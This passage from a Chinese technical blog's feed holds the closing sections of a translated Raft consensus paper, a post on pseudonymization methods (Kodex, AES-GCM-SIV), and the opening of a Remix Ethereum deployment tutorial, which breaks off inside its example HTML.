<p>增量压缩方法，例如日志清理或者日志结构合并树（log-structured merge trees，LSM 树），都是可行的。这些方法每次只对一小部分数据进行操作，这样就分散了压缩的负载压力。首先，它们先选择一个积累了大量已经被删除或者被覆盖的对象的数据区域，然后重写该区域还活着的对象，之后释放该区域。和快照技术相比，它们需要大量额外的机制和复杂性，快照技术通过操作整个数据集来简化该问题。状态机可以用和快照技术相同的接口来实现 LSM 树，但是日志清除方法就需要修改 Raft 了。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/12.png"><br>图12</p>
<blockquote>
<p>一台服务器用一个新快照替代了它日志中已经提交了的条目（索引 1 到 5），该快照只存储了当前的状态（变量 x 和 y 的值）。快照的 last included index 和 last included term 被保存来定位日志中条目 6 之前的快照</p>
</blockquote>
<p>图 12 展示了 Raft 中快照的基本思想。每个服务器独立地创建快照，快照只包括自己日志中已经被提交的条目。主要的工作是状态机将自己的状态写入快照中。Raft 快照中也包含了少量的元数据：the last included index 指的是最后一个被快照取代的日志条目的索引值（状态机最后应用的日志条目），the last included term 是该条目的任期号。保留这些元数据是为了支持快照后第一个条目的 AppendEntries 一致性检查，因为该条目需要之前的索引值和任期号。为了支持集群成员变更（第 6 节），快照中也包括日志中最新的配置作为 last included index 。一旦服务器完成写快照，他就可以删除 last included index 之前的所有日志条目，包括之前的快照。</p>
<p>尽管通常服务器都是独立地创建快照，但是 leader 必须偶尔发送快照给一些落后的 Follower 。这通常发生在 leader 已经丢弃了需要发送给 follower 的下一条日志条目的时候。幸运的是这种情况在常规操作中是不可能的：一个与 leader 保持同步的 follower 通常都会有该日志条目。然而一个例外的运行缓慢的 follower 或者新加入集群的服务器（第 6 节）将不会有这个条目。这时让该 follower 更新到最新的状态的方式就是通过网络把快照发送给它。</p>
<p>Leader 使用 InstallSnapshot RPC 来发送快照给太落后的 follower ；见图 13。当 follower 收到带有这种 RPC 的快照时，它必须决定如何处理已经存在的日志条目。通常该快照会包含接收者日志中没有的信息。在这种情况下，follower 丢弃它所有的日志；这些会被该快照所取代，并且可能一些没有提交的条目会和该快照产生冲突。如果接收到的快照是自己日志的前面部分（由于网络重传或者错误），那么被快照包含的条目将会被全部删除，但是快照之后的条目仍然有用并保留。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/13.png"><br>图13</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>Leader 的任期</td>
</tr>
<tr>
<td>leaderId</td>
<td>为了 Follower 能重定向到客户端</td>
</tr>
<tr>
<td>lastIncludedIndex</td>
<td>快照中包含的最后日志条目的索引值</td>
</tr>
<tr>
<td>lastIncludedTerm</td>
<td>快照中包含的最后日志条目的任期号</td>
</tr>
<tr>
<td>offset</td>
<td>分块在快照中的偏移量</td>
</tr>
<tr>
<td>data[]</td>
<td>快照块的原始数据</td>
</tr>
<tr>
<td>done</td>
<td>如果是最后一块数据则为 true</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>term</td>
<td>currentTerm，用于 Leader 更新自己的任期</td>
</tr>
</tbody></table>
<p>接受者需要实现：</p>
<ol>
<li>如果term &lt; currentTerm立刻回复</li>
<li>如果是第一个分块（offset 为 0）则创建新的快照</li>
<li>在指定的偏移量写入数据</li>
<li>如果 done为 false，则回复并继续等待之后的数据</li>
<li>保存快照文件，丢弃所有存在的或者部分有着更小索引号的快照</li>
<li>如果现存的日志拥有相同的最后任期号和索引值，则后面的数据继续保留并且回复</li>
<li>丢弃全部日志</li>
<li>能够使用快照来恢复状态机（并且装载快照中的集群配置）</li>
</ol>
<p>表-13：InstallSnapshot RPC 的总结。为了便于传输，快照都是被分成分块的；每个分块都给了 Follower 生存的信号，所以 Follower 可以重置选举超时计时</p>
<p>这种快照的方式违反了 Raft 的 strong leader 原则，因为 follower 可以在不知道 leader 状态的情况下创建快照。但是我们认为这种违背是合乎情理的。Leader 的存在，是为了防止在达成一致性的时候的冲突，但是在创建快照的时候，一致性已经达成，因此没有决策会冲突。数据依然只能从 leader 流到 follower ，只是 follower 可以重新组织它们的数据了。</p>
<p>我们考虑过一种可替代的基于 leader 的快照方案，在该方案中，只有leader 会创建快照，然后 leader 会发送它的快照给所有的 follower 。但是这样做有两个缺点。第一，发送快照会浪费网络带宽并且延缓了快照过程。每个 follower 都已经拥有了创建自己的快照所需要的信息，而且很显然，follower 从本地的状态中创建快照远比通过网络接收别人发来的要来得经济。第二，leader 的实现会更加复杂。例如，leader 发送快照给 follower 的同时也要并行地将新的日志条目发送给它们，这样才不会阻塞新的客户端请求。</p>
<p>还有两个问题会影响快照的性能。首先，服务器必须决定什么时候创建快照。如果快照创建过于频繁，那么就会浪费大量的磁盘带宽和其他资源；如果创建快照频率太低，就要承担耗尽存储容量的风险，同时也增加了重启时日志回放的时间。一个简单的策略就是当日志大小达到一个固定大小的时候就创建一次快照。如果这个阈值设置得显著大于期望的快照的大小，那么快照的磁盘带宽负载就会很小。</p>
<p>第二个性能问题就是写入快照需要花费一段时间，并且我们不希望它影响到正常的操作。解决方案是通过写时复制的技术，这样新的更新就可以在不影响正在写的快照的情况下被接收。例如，具有泛函数据结构的状态机天然支持这样的功能。另外，操作系统对写时复制技术的支持（如 Linux 上的 fork）可以被用来创建整个状态机的内存快照（我们的实现用的就是这种方法）。</p>
<h3 id="客户端交互"><a href="#客户端交互" class="headerlink" title="客户端交互"></a>客户端交互</h3><p>本节介绍客户端如何和 Raft 进行交互，包括客户端如何找到 leader 和 Raft 是如何支持线性化语义的。这些问题对于所有基于一致性的系统都存在，并且 Raft 的解决方案和其他的也差不多。</p>
<p>Raft 的客户端发送所有的请求给 leader 。当客户端第一次启动的时候，它会随机挑选一个服务器进行通信。如果客户端第一次挑选的服务器不是 leader ，那么该服务器会拒绝客户端的请求并且提供关于它最近接收到的 Leader 的信息（AppendEntries 请求包含了 leader 的网络地址）。如果 leader 已经崩溃了，客户端请求就会超时；客户端之后会再次随机挑选服务器进行重试。</p>
<p>我们 Raft 的目标是要实现线性化语义（每一次操作立即执行，只执行一次，在它的调用和回复之间）。但是，如上述，Raft 可能执行同一条命令多次：例如，如果 leader 在提交了该日志条目之后，响应客户端之前崩溃了，那么客户端会和新的 leader 重试这条指令，导致这条命令被再次执行。解决方案就是客户端对于每一条指令都赋予一个唯一的序列号。然后，状态机跟踪每个客户端已经处理的最新的序列号以及相关联的回复。如果接收到一条指令，该指令的序列号已经被执行过了，就立即返回结果，而不重新执行该请求。</p>
<p>只读的操作可以直接处理而不需要记录日志。但是，如果不采取任何其他措施，这么做可能会有返回过时数据（stale data）的风险，因为 leader 响应客户端请求时可能已经被新的 leader 替代了，但是它还不知道自己已经不是最新的 leader 了。线性化的读操作肯定不会返回过时数据，Raft 需要使用两个额外的预防措施来在不使用日志的情况下保证这一点。首先，leader 必须有关于哪些日志条目被提交了的最新信息。Leader 完整性特性保证了 leader 一定拥有所有已经被提交的日志条目，但是在它任期开始的时候，它可能不知道哪些是已经被提交的。为了知道这些信息，它需要在它的任期里提交一个日志条目。Raft 通过让 leader 在任期开始的时候提交一个空的没有任何操作的日志条目到日志中来处理该问题。第二，leader 在处理只读请求之前必须检查自己是否已经被替代了（如果一个更新的 leader 被选举出来了，它的信息就是过时的了）。Raft 通过让 leader 在响应只读请求之前，先和集群中的过半节点交换一次心跳信息来处理该问题。另一种可选的方案，leader 可以依赖心跳机制来实现一种租约的形式，但是这种方法依赖 timing 来保证安全性（假设时间误差是有界的）。</p>
<h3 id="实现和评价"><a href="#实现和评价" class="headerlink" title="实现和评价"></a>实现和评价</h3><p>我们已经为 RAMCloud 实现了 Raft 算法作为存储配置信息的复制状态机的一部分，并且帮助 RAMCloud 协调故障转移。这个 Raft 实现包含大约 2000 行 C++ 代码，其中不包括测试、注释和空行。这些代码是开源的。同时也有大约 25 个其他独立的第三方的基于这篇论文草稿的开源实现，针对不同的开发场景。同时，很多公司已经部署了基于 Raft 的系统。</p>
<p>这一章会从三个方面来评估 Raft 算法：可理解性、正确性和性能。</p>
<h4 id="可理解性"><a href="#可理解性" class="headerlink" title="可理解性"></a>可理解性</h4><p>为了比较 Paxos 和 Raft 算法的可理解性，我们针对高层次的本科生和研究生，在斯坦福大学的高级操作系统课程和加州大学伯克利分校的分布式计算课程上，进行了一次学习的实验。我们分别拍了针对 Raft 和 Paxos 的视频课程，并准备了相应的小测验。Raft 的视频讲课覆盖了这篇论文除了日志压缩之外的所有内容；Paxos 课程包含了足够的资料来创建一个等价的复制状态机，包括单决策 Paxos，多决策 Paxos，重新配置和一些实际系统需要的性能优化（例如 Leader 选举）。小测验测试一些对算法的基本理解和解释一些示例。每个学生都是看完第一个视频，回答相应的测试，再看第二个视频，回答相应的测试。大约有一半的学生先进行 Paxos 部分，然后另一半先进行 Raft 部分，这是为了说明两者独立的区别从第一个算法处学来的经验。我们计算参加人员的每一个小测验的得分来看参与者是否对 Raft 的理解更好。</p>
<table>
<thead>
<tr>
<th>因素</th>
<th>消除偏见的手段</th>
<th>复习材料</th>
</tr>
</thead>
<tbody><tr>
<td>相同的讲课质量</td>
<td>使用相同的讲师。Paxos 的讲义是基于之前在几所大学中使用的材料的并且做了改进。Paxos 的讲义要长 14%</td>
<td>视频</td>
</tr>
<tr>
<td>相同的测试难度</td>
<td>用难度给问题分组，在测试中成对出现</td>
<td>测验</td>
</tr>
<tr>
<td>标准的打分</td>
<td>使用红字标题。随机顺序打分，两个测验交替进行</td>
<td>红字标题</td>
</tr>
</tbody></table>
<p>表-1：考虑到的可能造成偏见的因素，以及解决方案和对应的复习材料</p>
<p>我们尽可能的使得 Paxos 和 Raft 的比较更加公平。这个实验偏爱 Paxos 表现在两个方面：43 个参加者中有 15 个人在之前有一些 Paxos 的经验，并且 Paxos 的视频要长 14%。如表-1 总结的那样，我们采取了一些措施来减轻这种潜在的偏见。我们所有的材料都可供审查。</p>
<p>参加者平均在 Raft 的测验中比 Paxos 高 4.9 分（总分 60，那么 Raft 的平均得分是 25.7，而 Paxos 是 20.8）；图-14 展示了每个参与者的得分。一对 t -测试表明，拥有 95% 的可信度，真实的 Raft 分数分布至少比 Paxos 高 2.5 分。</p>
<p>我们也建立了一个线性回归模型来预测一个新的学生的测验成绩，基于以下三个因素：他们使用的是哪个小测验，之前对 Paxos 的经验，和学习算法的顺序。模型显示，对小测验的选择会产生 12.5 分的差别在对 Raft 的好感度上。这显著的高于之前的 4.9 分，因为很多学生在之前都已经有了对于 Paxos 的经验，这相当明显的帮助 Paxos，对 Raft 就没什么太大影响了。但是奇怪的是，模型预测对于先进行 Paxos 小测验的人而言，Raft 的小测验得分会比 Paxos 低 6.3 分；我们不知道为什么，但这在统计学上是这样的。</p>
<p>我们同时也在测验之后调查了参与者，他们认为哪个算法更加容易实现和解释；这个的结果在图-15 上。压倒性的结果表明 Raft 算法更加容易实现和解释（41 人中的 33个）。但是，这种自己报告的结果不如参与者的成绩更加可信，并且参与者可能因为我们的 Raft 更加易于理解的假说而产生偏见。</p>
<p>关于 Raft 用户学习有一个更加详细的讨论，详见<a href="https://ramcloud.stanford.edu/~ongaro/thesis.pdf">http://ramcloud.stanford.edu/~ongaro/thesis.pdf</a></p>
<h4 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h4><p>在第5章，我们已经进行了一个<a href="http://ramcloud.stanford.edu/~ongaro/thesis.pdf">正式的说明</a>，和对一致性机制的安全性证明。这个正式说明通过 TLA+ 让 表-2 中的信息非常清晰。它大约有 400 行并且充当了证明的主题。同时对于任何想实现的人也是十分有用的。我们非常机械的通过 TLA 证明系统证明了日志完全特性（Log Completeness Property）。然而，这个证明依赖的约束前提还没有被机械证明（例如，我们还没有证明这个说明中的类型安全 type safety）。而且，我们已经写了一个非正式的证明关于状态机安全性质是完备的，并且是相当清晰的（大约 3500 个词）。</p>
<h4 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h4><p>Raft 和其他一致性算法例如 Paxos 有着差不多的性能。在性能方面，最重要的关注点是，当 Leader 被选举成功时，什么时候复制新的日志条目。Raft 通过很少数量的消息包（一轮从 Leader 到集群大多数机器的消息）就达成了这个目的。同时，进一步提升 Raft 的性能也是可行的。例如，很容易通过支持批量操作和管道操作来提高吞吐量和降低延迟。对于其他一致性算法已经提出过很多性能优化方案；其中有很多也可以应用到 Raft 中来，但是我们暂时把这个问题放到未来的工作中去。</p>
<p>我们使用我们自己的 Raft 实现来衡量 Raft  Leader 选举的性能并且回答以下两个问题。首先， Leader 选举的过程收敛是否快速？第二，在 Leader 宕机之后，最小的系统宕机时间是多久？</p>
<p>为了衡量 Leader 选举，我们反复的使一个拥有五个节点的服务器集群的 Leader 宕机，并计算需要多久才能发现 Leader 已经宕机并选出一个新的 Leader （见图-16）。为了构建一个最坏的场景，在每一的尝试里，服务器都有不同长度的日志，意味着有些 Candidate 是没有成为 Leader 的资格的。另外，为了促成选票瓜分的情况，我们的测试脚本在终止 Leader 之前同步的发送了一次心跳广播（这大约和 Leader 在崩溃前复制一个新的日志给其他机器很像）。 Leader 均匀的随机的在心跳间隔里宕机，也就是最小选举超时时间的一半。因此，最小宕机时间大约就是最小选举超时时间的一半。</p>
<p>图-16 上面的图表表明，只需要在选举超时时间上使用很少的随机化就可以大大避免选票被瓜分的情况。在没有随机化的情况下，在我们的测试里，选举过程由于太多的选票瓜分的情况往往都需要花费超过 10 秒钟。仅仅增加 5 毫秒的随机化时间，就大大的改善了选举过程，现在平均的宕机时间只有 287 毫秒。增加更多的随机化时间可以大大改善最坏情况：通过增加 50 毫秒的随机化时间，最坏的完成情况（1000 次尝试）只要 513 毫秒。</p>
<p>图-16 中下面的图显示，通过减少选举超时时间可以减少系统的宕机时间。在选举超时时间为 12-24 毫秒的情况下，只需要平均 35 毫秒就可以选举出新的 Leader （最长的一次花费了 152 毫秒）。然而，进一步降低选举超时时间的话就会违反 Raft 的时间不等式需求：在选举新 Leader 之前， Leader 就很难发送完心跳包。这会导致没有意义的 Leader 改变并降低了系统整体的可用性。我们建议使用更为保守的选举超时时间，比如 150-300 毫秒；这样的时间不大可能导致没有意义的 Leader 改变，而且依然提供不错的可用性。</p>
<h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><p>已经有很多关于一致性算法的工作被发表出来，其中很多都可以归到下面的类别中：</p>
<p>Lamport 关于 Paxos 的原始描述，和尝试描述的更清晰的论文。<br>关于 Paxos 的更详尽的描述，补充遗漏的细节并修改算法，使得可以提供更加容易的实现基础。<br>实现一致性算法的系统，例如 Chubby，ZooKeeper 和 Spanner。对于 Chubby 和 Spanner 的算法并没有公开发表其技术细节，尽管他们都声称是基于 Paxos 的。ZooKeeper 的算法细节已经发表，但是和 Paxos 有着很大的差别。<br>Paxos 可以应用的性能优化。<br>Oki 和 Liskov 的 Viewstamped Replication（VR），一种和 Paxos 差不多的替代算法。原始的算法描述和分布式传输协议耦合在了一起，但是核心的一致性算法在最近的更新里被分离了出来。VR 使用了一种基于 Leader 的方法，和 Raft 有很多相似之处。<br>Raft 和 Paxos 最大的不同之处就在于 Raft 的强领导特性：Raft 使用 Leader 选举作为一致性协议里必不可少的部分，并且将尽可能多的功能集中到了 Leader 身上。这样就可以使得算法更加容易理解。例如，在 Paxos 中， Leader 选举和基本的一致性协议是正交的： Leader 选举仅仅是性能优化的手段，而且不是一致性所必须要求的。但是，这样就增加了多余的机制：Paxos 同时包含了针对基本一致性要求的两阶段提交协议和针对 Leader 选举的独立的机制。相比较而言，Raft 就直接将 Leader 选举纳入到一致性算法中，并作为两阶段一致性的第一步。这样就减少了很多机制。</p>
<p>像 Raft 一样，VR 和 ZooKeeper 也是基于 Leader 的，因此他们也拥有一些 Raft 的优点。但是，Raft 比 VR 和 ZooKeeper 拥有更少的机制因为 Raft 尽可能的减少了非 Leader 的功能。例如，Raft 中日志条目都遵循着从 Leader 发送给其他人这一个方向：附加条目 RPC 是向外发送的。在 VR 中，日志条目的流动是双向的（ Leader 可以在选举过程中接收日志）；这就导致了额外的机制和复杂性。根据 ZooKeeper 公开的资料看，它的日志条目也是双向传输的，但是它的实现更像 Raft。</p>
<p>和上述我们提及的其他基于一致性的日志复制算法中，Raft 的消息类型更少。例如，我们数了一下 VR 和 ZooKeeper 使用的用来基本一致性需要和成员改变的消息数（排除了日志压缩和客户端交互，因为这些都比较独立且和算法关系不大）。VR 和 ZooKeeper 都分别定义了 10 中不同的消息类型，相对的，Raft 只有 4 中消息类型（两种 RPC 请求和对应的响应）。Raft 的消息都稍微比其他算法的要信息量大，但是都很简单。另外，VR 和 ZooKeeper 都在 Leader 改变时传输了整个日志；所以为了能够实践中使用，额外的消息类型就很必要了。</p>
<p>Raft 的强 Leader 模型简化了整个算法，但是同时也排斥了一些性能优化的方法。例如，平等主义 Paxos （EPaxos）在某些没有 Leader 的情况下可以达到很高的性能。平等主义 Paxos 充分发挥了在状态机指令中的交换性。任何服务器都可以在一轮通信下就提交指令，除非其他指令同时被提出了。然而，如果指令都是并发的被提出，并且互相之间不通信沟通，那么 EPaxos 就需要额外的一轮通信。因为任何服务器都可以提交指令，所以 EPaxos 在服务器之间的负载均衡做的很好，并且很容易在 WAN 网络环境下获得很低的延迟。但是，他在 Paxos 上增加了非常明显的复杂性。</p>
<p>一些集群成员变换的方法已经被提出或者在其他的工作中被实现，包括 Lamport 的原始的讨论，VR 和 SMART。我们选择使用共同一致（joint consensus）的方法因为它对一致性协议的其他部分影响很小，这样我们只需要很少的一些机制就可以实现成员变换。Raft 没有采用 Lamport 的基于 α 的方法是因为它假设在没有 Leader 的情况下也可以达到一致性。和 VR 和 SMART 相比较，Raft 的重新配置算法可以在不限制正常请求处理的情况下进行；相比较而言，VR 需要停止所有的处理过程，SMART 引入了一个和 α 类似的方法，限制了请求处理的数量。和 VR、SMART 比较而言，Raft 的方法同时需要更少的额外机制来实现。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>算法的设计通常会把正确性，效率或者简洁作为主要的目标。尽管这些都是很有意义的目标，但是我们相信，可理解性也是一样的重要。在开发者把算法应用到实际的系统中之前，这些目标没有一个会被实现，这些都会必然的偏离发表时的形式。除非开发人员对这个算法有着很深的理解并且有着直观的感觉，否则将会对他们而言很难在实现的时候保持原有期望的特性。</p>
<p>在这篇论文中，我们尝试解决分布式一致性问题，但是一个广为接受但是十分令人费解的算法 Paxos 已经困扰了无数学生和开发者很多年了。我们创造了一种新的算法 Raft，显而易见的比 Paxos 要容易理解。我们同时也相信，Raft 也可以为实际的实现提供坚实的基础。把可理解性作为设计的目标改变了我们设计 Raft 的方式；这个过程是我们发现我们最终很少有技术上的重复，例如问题分解和简化状态空间。这些技术不仅提升了 Raft 的可理解性，同时也使我们坚信其正确性。</p>
<ul>
<li>原文参考： <a href="https://raft.github.io/">Raft 网站</a></li>
</ul>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Pseudonymization算法</title>
    <url>/2024/05/11/Pseudonymization%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p><a href="https://www.youtube.com/watch?v=V2UJ9xzbJGs&amp;t=10633s">https://www.youtube.com/watch?v=V2UJ9xzbJGs&amp;t=10633s</a><br><a href="https://www.bis.org/about/bisih/topics/cbdc/mcbdc_bridge.htm">https://www.bis.org/about/bisih/topics/cbdc/mcbdc_bridge.htm</a><br>BIS Innovation Summit 2024: Navigating rapid innovation (day 1)中，mbridge (showcase)中讲到，其项目的privacy中使用了 Pseudonymization algorithm。下面针对 Pseudonymization 展开详细讲述。</p>
<h2 id="1-https-github-com-kiprotect-kodex"><a href="#1-https-github-com-kiprotect-kodex" class="headerlink" title="1. https://github.com/kiprotect/kodex"></a>1. <a href="https://github.com/kiprotect/kodex">https://github.com/kiprotect/kodex</a></h2><p>假名化（Pseudonymization）算法可以分为几个类别，包括可逆和不可逆方法，以及结构保持和格式保持方法。以下是网页中提到的一些关键点：</p>
<h3 id="假名化技术（PET）"><a href="#假名化技术（PET）" class="headerlink" title="假名化技术（PET）"></a>假名化技术（PET）</h3><ul>
<li>假名化是一种隐私增强技术，它将数据点中的直接或间接标识符替换为其他“假名”值，从而保护数据所属个体的身份。</li>
</ul>
<h3 id="假名化方法分类"><a href="#假名化方法分类" class="headerlink" title="假名化方法分类"></a>假名化方法分类</h3><ul>
<li><strong>可逆假名化方法</strong>：允许数据去假名化，即利用额外数据（如加密密钥或映射表）从假名恢复到原始标识符。</li>
<li><strong>不可逆假名化方法</strong>：不允许从假名恢复到原始标识符。</li>
<li><strong>确定性假名化方法</strong>：对同一个标识符应用时总是创建相同的假名。</li>
<li><strong>非确定性方法</strong>：即使多次应用到同一个标识符，也会生成随机假名。</li>
<li><strong>结构保持假名化方法</strong>：保持标识符的特定内部结构。</li>
<li><strong>格式保持假名化方法</strong>：保持数据的原始格式。</li>
</ul>
<h3 id="可逆方法"><a href="#可逆方法" class="headerlink" title="可逆方法"></a>可逆方法</h3><p>Kodex支持基于格式保持加密的可逆假名化方法。使用原始密钥可以解密/去假名化生成的假名。例如，<code>merengue</code>假名化方法可以操作任意二进制数据，并生成二进制假名，此外还可以保持数据的前缀结构。</p>
<h3 id="结构保持方法"><a href="#结构保持方法" class="headerlink" title="结构保持方法"></a>结构保持方法</h3><p>基于<code>merengue</code>方法，Kodex提供了多种结构保持假名化方法，可以操作如时间戳、IP地址和数字等数据类型。这些方法保持原始数据的格式，并且也可以保持结构信息。</p>
<h3 id="不可逆方法"><a href="#不可逆方法" class="headerlink" title="不可逆方法"></a>不可逆方法</h3><p>Kodex也支持不可逆假名化方法，特别是基于密钥哈希的消息认证码（HMAC）的假名化，以及无密钥哈希的假名化（强烈不推荐）。例如，以下动作生成基于HMAC的假名：</p>
<h3 id="假名化方法的配置参数"><a href="#假名化方法的配置参数" class="headerlink" title="假名化方法的配置参数"></a>假名化方法的配置参数</h3><ul>
<li><code>merengue</code>方法接受一个<code>encode</code>参数，指定结果字节字符串的编码。目前唯一可能的值（也是默认值）是<code>base64</code>。</li>
<li><code>structured</code>方法接受以下参数：<ul>
<li><code>preserve-prefixes</code>：如果为_true_，将保留结构化数据值的前缀。例如，使用_date_格式时，具有共同前缀的日期（例如相同的年和月）将映射到也共享相同长度前缀的假名。默认为_false_。</li>
<li><code>type</code>：指定要假名化的数据类型。必须是<code>ip</code>、<code>date</code>、<code>integer</code>、<code>ipv4</code>或<code>ipv6</code>之一。</li>
<li><code>type-params</code>：根据所选类型指定额外的类型参数。目前，只有<code>integer</code>类型需要强制的<code>min</code>和<code>max</code>类型参数，以指定其范围。</li>
<li><code>format</code>：指定要假名化的数据的类型依赖格式（如果适用）。目前，只有<code>date</code>类型支持<code>format</code>参数。</li>
</ul>
</li>
</ul>
<h2 id="2-https-github-com-aws-samples-pseudonymization-service"><a href="#2-https-github-com-aws-samples-pseudonymization-service" class="headerlink" title="2. https://github.com/aws-samples/pseudonymization-service"></a>2. <a href="https://github.com/aws-samples/pseudonymization-service">https://github.com/aws-samples/pseudonymization-service</a></h2><p>示例中，pseudonymization-service 是利用 AES+gcm+siv实现的。<br><code>AES/GCM/SIV</code> 是一种基于 AES（高级加密标准）的加密模式，它结合了 Galois/Counter Mode（GCM）和 SIV（Synthetic Initialization Vector）的特性。</p>
<h3 id="AES-GCM-SIV-的关键特性："><a href="#AES-GCM-SIV-的关键特性：" class="headerlink" title="AES/GCM/SIV 的关键特性："></a>AES/GCM/SIV 的关键特性：</h3><ol>
<li><strong>AES (Advanced Encryption Standard)</strong>: AES 是一种广泛使用的对称加密算法，它以128位的块大小对数据进行加密。</li>
<li><strong>GCM (Galois/Counter Mode)</strong>: GCM 是一种认证加密模式，它不仅提供加密，还提供数据完整性校验和重放攻击保护。GCM 使用一个nonce（一次性密码），也称为初始化向量（IV），以及一个附加的认证标签（tag）来确保数据的完整性和真实性。</li>
<li><strong>SIV (Synthetic Initialization Vector)</strong>: SIV 是一种模式，它允许使用相同的加密密钥对多个消息进行加密，而不需要为每个消息生成新的随机IV。这在某些场景下非常有用，比如当需要加密大量数据或者需要从相同的密钥派生多个IV时。</li>
</ol>
<h3 id="EncryptionAESGCMSIV-类："><a href="#EncryptionAESGCMSIV-类：" class="headerlink" title="EncryptionAESGCMSIV 类："></a><code>EncryptionAESGCMSIV</code> 类：</h3><p>在 Java 中，<code>EncryptionAESGCMSIV</code> 类可能是用来实现 AES/GCM/SIV 加密模式的一个类。这个类可能包含以下功能：</p>
<ul>
<li><strong>加密数据</strong>：使用 AES/GCM/SIV 算法对输入数据进行加密，并生成密文和认证标签。</li>
<li><strong>解密数据</strong>：使用相同的加密密钥和正确的认证标签对密文进行解密，恢复原始数据。</li>
<li><strong>生成和验证认证标签</strong>：在加密过程中生成认证标签，并在解密过程中验证这个标签以确保数据的完整性和真实性。</li>
</ul>
<h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3><p>AES/GCM/SIV 算法适用于需要高安全性和效率的场景，特别是在以下情况：</p>
<ul>
<li>数据需要在不安全的通道上传输，比如互联网。</li>
<li>需要确保数据的完整性和防止篡改。</li>
<li>需要抵抗重放攻击，即攻击者不能简单地重放之前捕获的加密数据。</li>
</ul>
<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>使用任何加密算法时，都需要遵循最佳实践，比如：</p>
<ul>
<li>使用强密钥。</li>
<li>密钥管理应该安全，避免泄露。</li>
<li>使用合适的随机数生成器来生成 IV 或 nonce。</li>
</ul>
]]></content>
      <tags>
        <tag>CBDC</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Remix部署以太坊智能合约至远程节点</title>
    <url>/2018/02/13/Remix%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%87%B3%E8%BF%9C%E7%A8%8B%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<ol>
<li> 编写 solidity 代码，选择 Web3 Provider</li>
</ol>
<p>![](Remix部署以太坊智能合约至远程节点/remix remote deploy 1.png)</p>
<ol start="2">
<li>Yes</li>
</ol>
<p>![](Remix部署以太坊智能合约至远程节点/remix remote deploy 2.png)</p>
<ol start="3">
<li>节点IP地址</li>
</ol>
<p>![](Remix部署以太坊智能合约至远程节点/remix remote deploy 3.png)</p>
<ol start="4">
<li>点击 Create，部署代码。查看底部 log 成功与否，这里需要花费几秒钟的时间。成功后 copy 合约地址。</li>
</ol>
<p>![](Remix部署以太坊智能合约至远程节点/remix remote deploy 4.png)</p>
<ol start="5">
<li>本地查看调试网页。</li>
</ol>
<p>![](Remix部署以太坊智能合约至远程节点/remix remote deploy 5.png)</p>
<p>示例源码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;main.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./node_modules/web3/dist/web3.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Coursetro Instructor<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;instructor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;loader&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://loading.io/spinners/double-ring/lg.double-ring-spinner.gif&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-2 